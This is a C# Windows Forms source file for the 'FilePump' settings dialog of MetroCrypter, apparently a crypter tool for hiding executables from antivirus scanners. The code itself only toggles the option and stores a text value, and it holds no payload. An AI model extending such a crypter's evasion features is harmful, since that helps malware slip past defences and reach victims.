using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static MetroCrypter.Form1;
using MetroCrypter.Forms;

namespace MetroCrypter.Forms
{
    
    public partial class FilePump : Form
    {
        Popup pop;
        public FilePump()
        {
            InitializeComponent();
            
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }

        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        private void FilePump_Load(object sender, EventArgs e)
        {
            FilePumpTxt.Text = CID.txtPump;

            if (CID.fpreply == true)
            {
                button2.Enabled = true;
                button3.Text = "Enabled";
            }
            else
            {
                button3.Text = "Disabled";
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            if (String.IsNullOrEmpty(FilePumpTxt.Text) == false && CID.fpreply == true)
            {

                this.Close();
                CID.txtPump = FilePumpTxt.Text;
             
            }
            else
            {
                pop = new Popup("You didn't enter anything!");
                pop.Show();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {   
            
            if (CID.fpreply == true)
            {
                button2.Enabled = false;
                CID.fpreply = false;
                button3.Text = "Disabled";
            }
            else
            {
                button2.Enabled = true;
                CID.fpreply = true;
                button3.Text = "Enabled";
            }
        }
    }
}
